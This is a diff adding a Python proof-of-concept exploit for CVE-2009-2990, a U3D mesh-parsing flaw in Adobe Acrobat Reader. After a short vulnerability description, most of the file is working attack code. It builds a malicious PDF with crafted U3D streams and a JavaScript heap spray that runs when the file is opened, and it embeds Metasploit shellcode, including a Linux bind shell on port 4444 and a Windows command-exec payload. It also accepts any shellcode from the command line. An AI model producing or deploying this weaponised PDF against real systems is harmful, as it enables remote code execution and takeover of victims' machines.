@@ -1,0 +1,491 @@
+#########################################################################
+####        Felipe Andres Manzano * felipe.andres.manzano@gmail.com  ####
+####        http://twitter/feliam                                    ####
+#########################################################################
+__doc__='''
+
+Title: U3D CLODProgressiveMeshContinuation Split Position Index arbitrary dereference.
+Product: Adobe Acrobat Reader
+Version: <=8.1.6, <=9.1.3
+Product Homepage: www.adobe.com 
+CVE: 2009-2990
+OSs: WinXPSPx/Linux
+
+Vulnerability Description
+-----------------------------------------
+Universal 3D (U3D) is a compressed file format standard for 3D computer
+graphics data. 
+
+
+When a U3D CLODProgressiveMeshContinuation (blocktype: 0xFFFFFF3C) is
+parsed by Adobe acrobat reader U3D plugin the split position index is
+readed from the input without any validation. That index is then used
+for getting an object out of the limits of the array, object from wich a
+function pointer is dereferenced and called.
+
+From the u3d specification:
+## 9.6.1.3.4.1 U32 [rCurrentPositionCount]: Split Position Index
+# Split Position Index is the index of the position to be split by this
+# Resolution Update.
+
+
+Exploiting:
+In acrobat using a well known js heap spray an attacker could control
+the contents of the dereferenced object and execute arbitrary code.
+Note that, at least for XP there is NO strict need to do the spray with JS/Flash.
+An multiexploit for {Adobe Acrobat Reader/Multilingual}x{7.x, 8.x,
+9.x}x{XPSP2, XPSP3, Linux} is provided as a ..  PoC.
+
+
+REFERENCES
+==========
+http://www.adobe.com/support/security/bulletins/apsb09-15.html
+http://en.wikipedia.org/wiki/Universal_3D
+http://www.ecma-international.org/publications/files/ECMA-ST/ECMA-363%204th%20edition.pdf
+http://www.adobe.com/devnet/acrobat3d/pdfs/U3DElements.pdf  
+http://www.ucon-conference.org/materials/2009/HackingPDFReaders-uCon-2009.pdf
+
+Vulnerability WorkAround (if possible)
+-----------------------------------------
+PATCH AVAILABLE!
+
+
+'''
+import os
+import zlib
+import sys
+import struct
+
+#For constructing a minimal pdf file
+class PDFObject:
+    def __init__(self):
+        self.n=None
+        self.v=None
+
+    def __str__(self):
+        raise "Fail"
+
+class PDFStream(PDFObject):
+    def __init__(self, dict,stream):
+        PDFObject.__init__(self)
+        dict.add('Length', len(stream))
+        self.dict=dict
+        self.stream=stream
+
+    def __str__(self):
+        s=""
+        s+=self.dict.__str__()
+        s+="\nstream\n"
+        s+=self.stream
+        s+="\nendstream"
+        return s
+
+class PDFArray(PDFObject):
+    def __init__(self,s):
+        PDFObject.__init__(self)
+        self.s=s
+    def __str__(self):
+        return "[%s]"%(" ".join([ o.__str__() for o in self.s]))
+
+
+class PDFDict(PDFObject):
+    def __init__(self):
+        PDFObject.__init__(self)
+        self.dict = []    
+
+    def add(self,name,obj):
+        self.dict.append((name,obj))
+
+    def __str__(self):
+        s="<<"
+        for name,obj in self.dict:
+            s+="/%s %s "%(name,obj)
+        s+=">>"
+        return s
+
+class PDFName(PDFObject):
+    def __init__(self,s):
+        PDFObject.__init__(self)
+        self.s=s
+    def __str__(self):
+        return "/%s"%self.s
+
+class PDFString(PDFObject):
+    def __init__(self,s):
+        PDFObject.__init__(self)
+        self.s=s
+
+    def __str__(self):
+        return "(%s)"%self.s
+
+class PDFHexString(PDFObject):
+    def __init__(self,s):
+        PDFObject.__init__(self)
+        self.s=s
+
+    def __str__(self):
+        return "<" + "".join(["%02x"%ord(c) for c in self.s]) + ">"
+
+class PDFOctalString(PDFObject):
+    def __init__(self,s):
+        PDFObject.__init__(self)
+        self.s="".join(["\\%03o"%ord(c) for c in s])
+
+    def __str__(self):
+        return "(%s)"%self.s
+
+class PDFNum(PDFObject):
+    def __init__(self,s):
+        PDFObject.__init__(self)
+        self.s=s
+
+    def __str__(self):
+        return "%s"%self.s
+
+class PDFBool(PDFObject):
+    def __init__(self,s):
+        PDFObject.__init__(self)
+        self.s=s
+
+    def __str__(self):
+        if self.s:
+            return "true"
+        return "false"
+
+class PDFRef(PDFObject):
+    def __init__(self,obj):
+        PDFObject.__init__(self)
+        self.obj=[obj]
+    def __str__(self):
+        return "%d %d R"%(self.obj[0].n,self.obj[0].v)
+
+class PDFNull(PDFObject):
+    def __init__(self):
+        PDFObject.__init__(self)
+
+    def __str__(self):
+        return "null"
+
+
+class PDFDoc():
+    def __init__(self):
+        self.objs=[]
+
+    def setRoot(self,root):
+        self.root=root
+
+    def _add(self,obj):
+        obj.v=0
+        obj.n=1+len(self.objs)
+        self.objs.append(obj)
+
+    def add(self,obj):
+        if type(obj) != type([]):
+            self._add(obj);
+        else:
+            for o in obj:
+                self._add(o)
+
+    def _header(self):
+        return "%PDF-1.7\n"
+
+    def __str__(self):
+        doc1 = self._header()
+        xref = {}
+        for obj in self.objs:
+            xref[obj.n] = len(doc1)
+            doc1+="%d %d obj\n"%(obj.n,obj.v)
+            doc1+=obj.__str__()
+            doc1+="\nendobj\n" 
+        posxref=len(doc1)
+        doc1+="xref\n"
+        doc1+="0 %d\n"%(len(self.objs)+1)
+        doc1+="0000000000 65535 f\n"
+        for xr in xref.keys():
+            doc1+= "%010d %05d n\n"%(xref[xr],0)
+        doc1+="trailer\n"
+        trailer =  PDFDict()
+        trailer.add("Size",len(self.objs)+1)
+        trailer.add("Root",PDFRef(self.root))
+        doc1+=trailer.__str__()
+        doc1+="\nstartxref\n%d\n"%posxref
+        doc1+="%%EOF\n\n"
+
+        return doc1
+
+##Main
+## linux_ia32_bind -  LPORT=4444 Size=84 Encoder=None http://metasploit.com 
+
+linScode = "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
+linScode += "\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
+linScode += "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
+linScode += "\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
+linScode += "\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
+linScode += "\x89\xe1\xcd\x80"
+
+# win32_exec -  EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com 
+w32Scode = "\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x88"
+w32Scode += "\x06\x28\x26\x83\xeb\xfc\xe2\xf4\x74\xee\x6c\x26\x88\x06\xa3\x63"
+w32Scode += "\xb4\x8d\x54\x23\xf0\x07\xc7\xad\xc7\x1e\xa3\x79\xa8\x07\xc3\x6f"
+w32Scode += "\x03\x32\xa3\x27\x66\x37\xe8\xbf\x24\x82\xe8\x52\x8f\xc7\xe2\x2b"
+w32Scode += "\x89\xc4\xc3\xd2\xb3\x52\x0c\x22\xfd\xe3\xa3\x79\xac\x07\xc3\x40"
+w32Scode += "\x03\x0a\x63\xad\xd7\x1a\x29\xcd\x03\x1a\xa3\x27\x63\x8f\x74\x02"
+w32Scode += "\x8c\xc5\x19\xe6\xec\x8d\x68\x16\x0d\xc6\x50\x2a\x03\x46\x24\xad"
+w32Scode += "\xf8\x1a\x85\xad\xe0\x0e\xc3\x2f\x03\x86\x98\x26\x88\x06\xa3\x4e"
+w32Scode += "\xb4\x59\x19\xd0\xe8\x50\xa1\xde\x0b\xc6\x53\x76\xe0\x78\xf0\xc4"
+w32Scode += "\xfb\x6e\xb0\xd8\x02\x08\x7f\xd9\x6f\x65\x49\x4a\xeb\x28\x4d\x5e"
+w32Scode += "\xed\x06\x28\x26"
+
+#Trap shellcode
+dbgScode = "\xcc"*10
+
+
+class PDFU3DExploit:
+    def _toJS(self, s):
+        if len(s) % 2 != 0:
+            raise "Err! Should be even number of chars"
+        r = ""
+        for i in range (0,len(s)/2):
+            r += "%u"+ "".join([ "%02x%02x"%(ord(s[i*2+1]),ord(s[i*2]))])
+        return r
+
+
+    def _getU3DStream(self, index):
+        stream =  "\x53\x6f\x72\x72\x79\x2c\x20\x6b\x69\x6c\x6c\x69\x6e\x67\x20\x73"
+        stream += "\x6f\x6d\x65\x20\x73\x6b\x69\x64\x64\x69\x65\x73\x2e\x20\x20\x20"
+        stream += "\x55\x33\x44\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
+        stream += "\x00\x00\x00\x00\x24\x00\x00\x00\x80\xb6\x02\x00\x00\x00\x00\x00"
+        stream += "\x6a\x00\x00\x00\x14\xff\xff\xff\xa0\x00\x00\x00\x00\x00\x00\x00"
+        stream += "\x0b\x00\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x01\x00\x00"
+        stream += "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x31\xff\xff\xff"
+        stream += "\x75\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x45\x45\x45\x45\x45\x45"
+        stream += "\x45\x45\x45\x45\x45\x00\x00\x00\x00\x00\x00\x00\x00\x22\xc3\x00"
+        stream += "\x00\x26\x62\x00\x00\x66\x49\x02\x00\x00\x00\x00\x00\x00\x00\x00"
+        stream += "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
+        stream += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x26\x62\x00\x00\x2c\x01\x00"
+        stream += "\x00\x2c\x01\x00\x00\x2c\x01\x00\x00\x6c\x1e\x0b\x3f\xa6\x05\x6f"
+        stream += "\x3b\xa6\x05\x6f\x3b\x4a\xf5\x2d\x3c\x4a\xf5\x2d\x3c\x66\x66\x66"
+        stream += "\x3f\x00\x00\x00\x3f\xf6\x28\x7c\x3f\x00\x00\x00\x00\x00\x00\x00"
+        stream += "\x3c\xff\xff\xff\xf6\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x45\x45"
+        stream += "\x45\x45\x45\x45\x45\x45\x45\x45\x45\x00\x00\x00\x00\x00\x00\x00"
+        stream += "\x00\x00\x10\x00\x00"
+        stream += struct.pack("<L",index)  
+        stream += "\x00\x00\x00\x00\x00\x00\x00"
+        stream += "\x00\x00\x00\x07\x9c\x00\x00\x00\x37\x0c\x00\x00\xd0\x02\x00\x00"
+        stream += "\x3f\xeb\x95\x0d\x00\x00\x76\x05\x00\x00\xea\x15\x00\x00\xe2\x02"
+        stream += "\x00\x00\x00\x00\x00\x00\x80\x82\x22\x8e\x2f\xaa\x00\x00\x00\xc2"
+        stream += "\x13\x23\x00\x20\xbb\x06\x00\x80\xc2\x1f\x00\x80\x20\x00\x00\x00"
+        stream += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xc0\x14\x01"
+        stream += "\x00\x20\x44\x0a\x00\x10\x7e\x4b\x8d\xf8\x7c\x32\x6d\x03\x00\x00"
+        stream += "\xb2\x0b\x00\x20\xfd\x19\x00\x20\xb6\xe9\xea\x2e\x55\x00\x00\x59"
+        stream += "\x94\x00\x00\x4c\x00\x01\x00\x1a\xbb\xa0\xc8\xc1\x04\x00\x70\xc4"
+        stream += "\xa0\x00\x00\x00\x6c\x98\x46\xac\x04\x00\x60\xf6\x1c\x00\x20\xa1"
+        stream += "\x0f\x00\xa0\x17\x66\x23\x00\x00\xde\x88\x1d\x00\x00\x7b\x16\x9f"
+        stream += "\x72\x9a\x1d\x15\x00\x80\xeb\x39\x00\x00\x00\x00\x00\x00\x94\xc8"
+        stream += "\x00\x00\x54\xce\xfb\x32\x00\x80\xc4\x3e\xb0\xc4\x88\xde\x77\x00"
+        stream += "\x00\x46\x72\x01\x00\xf0\x56\x01\x00\x8c\x53\xe9\x10\x9d\x6b\x06"
+        stream += "\x00\x50\xa2\x00"
+
+        #laziest hack ever! Another index must be found for using the following 
+        # stream in windows.. and a lot of tests shoul be done.
+        if (index == 0x01d10000):
+            return stream
+
+        stream =  "\x53\x6f\x72\x72\x79\x2c\x20\x6b\x69\x6c\x6c\x69\x6e\x67\x20\x73"
+        stream += "\x6f\x6d\x65\x20\x73\x6b\x69\x64\x64\x69\x65\x73\x2e\x20\x20\x20"
+        stream += "\x55\x33\x44\x00\x18\x00\x00\x00\x16\x04\x00\x00\x00\x01\x00\x00"
+        stream += "\x00\x00\x00\x00\x24\x00\x00\x00\x74\x01\x00\x00\x00\x00\x00\x00"
+        stream += "\x6a\x00\x00\x00\x01\x00\x00\x00\x08\x00\x61\x6c\x61\x6c\x61\x6c"
+        stream += "\x61\x30\x01\x00\x00\x00\x00\x04\x00\x00"
+        stream += "\xa8"*1024
+        stream += "\x50\x50\x14\xff\xff\xff"
+        stream += "\xa0\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x41\x41\x41\x41\x41\x41"
+        stream += "\x41\x41\x41\x41\x41\x01\x00\x00\x00\x00\x00\x00\x00\x50\x50\x50"
+        stream += "\x01\x00\x00\x00\x31\xff\xff\xff\x75\x00\x00\x00\x00\x00\x00\x00"
+        stream += "\x0b\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x00"
+        stream += "\x00\x00\x00\x00\x00\x22\xc3\x00\x00\x26\x66\x00\x00\x04\x00\x00"
+        stream += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
+        stream += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00"
+        stream += "\x00\x65\x00\x00\x00\x2c\x01\x00\x00\x2c\x01\x00\x00\x2c\x01\x00"
+        stream += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        stream += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        stream += "\x00\x00\x00\x00\x00\x50\x50\x50\x3c\xff\xff\xff\x95\x00\x00\x00"
+        stream += "\x00\x00\x00\x00\x0b\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+        stream += "\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
+        stream += struct.pack("<L",index) #\x3c\xfe\xff"
+        stream += "\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00"
+        stream += "\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00"
+        stream += "\x00\x01\x00\x00\x00\x01\x00\x00\x00\x46\x65\x6c\x69\x46\x65\x6c"
+        stream += "\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c"
+        stream += "\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c"
+        stream += "\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c"
+        stream += "\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c"
+        stream += "\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x50\x50\x50"
+
+        return stream
+
+
+    def _getU3DAnnotation(self, u3d):
+        str3d = PDFDict()
+        str3d.add("Type","/3D")
+        str3d.add("Subtype","/U3D")
+
+        str3d = PDFStream(str3d,u3d)
+        self.doc.add(str3d)
+
+        annot3d = PDFDict()
+        annot3d.add("Type",PDFName("Annot")) 
+        annot3d.add("Subtype","/3D")
+        annot3d.add("Contents", "(a pwning u3d model)")
+        annot3d.add("3DI", "false")
+        annot3d.add("3DA", "<< /A /PO /DIS /I >>")
+        annot3d.add('Rect', PDFArray([ 0, 0, 640, 480]))
+        annot3d.add("3DD", PDFRef(str3d))
+        annot3d.add("F", "7")
+        self.doc.add(annot3d)
+        return  PDFRef(annot3d)
+
+
+    def __init__(self,w32scode,linscode):
+        self.doc= PDFDoc()
+        self.w32Scode = w32scode
+        self.linScode = linscode
+        javascript = PDFDict()
+        javascript.add("S", PDFName("JavaScript"))
+        javascript.add("JS", PDFHexString(''' 
+
+    var jmp = unescape("%u9090%u7f3e");
+    var nop = unescape("%u9090%u9090");
+
+    function mkSlice(str,size,rest){
+        while (str.length <= size/2) 
+            str += str;
+        str = str.substring(0, size/2 -32/2 -4/2 - rest -2/2);
+        return str;
+    };
+
+    function spray(escA,escB,escC,escShellcode){
+        var i;
+        var pointersA = unescape(escA);
+        var pointersB = unescape(escB);
+        var pointersC = unescape(escC);
+        var shellcode = unescape(escShellcode);
+
+        pointersA_slide=mkSlice(pointersA,0x100000, pointersA.length);
+        pointersB_slide=mkSlice(pointersB,0x100000, pointersB.length);
+        pointersC_slide=mkSlice(pointersC,0x100000, pointersC.length);
+        nop_slide = mkSlice(nop,0x100000, shellcode.length);
+        var x = new Array();       
+        for (i = 0; i < 400; i++) { 
+                if(i<100)
+                    x[i] = pointersA_slide+pointersA;
+                else if(i<200)
+                    x[i] = pointersB_slide+pointersB;
+                else if(i<300)
+                    x[i] = pointersC_slide+pointersC;
+                else
+                    x[i] = nop_slide+shellcode;
+            }
+       return x;
+    };
+    var mem;
+    if (app.platform == "WIN"){
+        mem = spray("%u0f0f%u0f0f","%u1616%u1616","%u1c1c%u1c1c","'''+self._toJS(self.w32Scode)+'''")
+        this.pageNum = 2;
+    }else if (app.platform =="MAC"){
+        this.pageNum = 0; //not exploitable
+    }else{
+        mem = spray("%u5979%u7975","%ua2a2%ua2a2","%u9c9c%u9c9c","'''+self._toJS(self.linScode)+'''");    
+        this.pageNum = 1;
+    }
+//feli
+    '''))
+
+        self.doc.add(javascript)
+
+        branding = PDFDict()
+        branding.add("Author", PDFString("Felipe Andres Manzano"))
+        branding.add("email", PDFString("felipe.andres.manzano@gmail.com"))
+        branding.add("web", PDFString("felipe.andres.manzano.googlepages.com"))
+        self.doc.add(branding)
+
+        #outline
+        outlines = PDFDict()
+        outlines.add("Type", PDFName("Outlines"))
+        outlines.add("Count",0)
+
+        #pages
+        pages = PDFDict()
+        pages.add("Type", PDFName("Pages"))
+
+        #catalog
+        catalog = PDFDict()
+        catalog.add("Type", PDFName("Catalog"))
+        catalog.add("Outlines", PDFRef(outlines))
+        catalog.add("Pages", PDFRef(pages))
+        catalog.add("OpenAction", PDFRef(javascript))
+
+        #lets add those to doc just for showing up the Ref object.
+        self.doc.add([catalog,outlines,pages])
+        #Set the pdf root
+        self.doc.setRoot(catalog)
+
+        contents = PDFStream(PDFDict(), '(Aaaaa) Tj' )
+        resources = PDFDict()
+        resources.add('ProcSet', PDFArray([PDFName('PDF')]))
+
+        self.doc.add([contents, resources])
+
+        #The pdf pages
+
+        linuxPage = PDFDict()
+        linuxPage.add('Type', PDFName('Page'))
+        linuxPage.add('Parent', PDFRef(pages))
+        linuxPage.add('MediaBox', PDFArray([ 0, 0, 640, 480]))
+        linuxPage.add('Contents', PDFRef(contents))
+        linuxPage.add('Resources', PDFRef(resources))
+
+#2.6.24linuxPage.add('Annots', PDFArray([self._getU3DAnnotation(self._getU3DStream(0xb0000))]))
+#2.6.27linuxPage.add('Annots', PDFArray([self._getU3DAnnotation(self._getU3DStream(0xbd0000))]))
+#linuxPage.add('Annots', PDFArray([self._getU3DAnnotation(self._getU3DStream(0xffffff9f))]))
+        linuxPage.add('Annots', PDFArray([self._getU3DAnnotation(self._getU3DStream(0xfffffe3c))]))
+        self.doc.add(linuxPage)
+
+
+        windowsPage = PDFDict()
+        windowsPage.add('Type', '/Page')
+        windowsPage.add('Parent', PDFRef(pages))
+        windowsPage.add('MediaBox', PDFArray([ 0, 0, 640, 480]))
+        windowsPage.add('Contents', PDFRef(contents))
+        windowsPage.add('Resources', PDFRef(resources))
+        windowsPage.add('Annots', PDFArray([self._getU3DAnnotation(self._getU3DStream(0x01d10000))]))
+
+        self.doc.add(windowsPage)
+
+        pageDummy = PDFDict()
+        pageDummy.add('Type', '/Page')
+        pageDummy.add('Parent', PDFRef(pages))
+        pageDummy.add('MediaBox', PDFArray([ 0, 0, 640, 480]))
+        pageDummy.add('Contents', PDFRef(contents))
+        pageDummy.add('Resources', PDFRef(resources))
+
+        self.doc.add(pageDummy)
+
+        pages.add('Count', PDFNum(3))
+        pages.add('Kids',PDFArray([PDFRef(pageDummy),PDFRef(linuxPage),PDFRef(windowsPage)]))
+
+
+    def render(self):
+        #render it
+        return self.doc.__str__()
+
+
+##Main
+if __name__=="__main__":
+    if len(sys.argv) != 2:
+        print __doc__
+        print "For metasploit integration check out:\n\t http://sites.google.com/site/felipeandresmanzano/python_pdf_wrapper.rb"
+        print "Usage:\n\t%s %s"%(sys.argv[0],"shellcode".encode('hex'))
+        sys.exit()
+    u3dpdf = PDFU3DExploit(sys.argv[1].decode('hex'),linScode)
+    print u3dpdf.render()
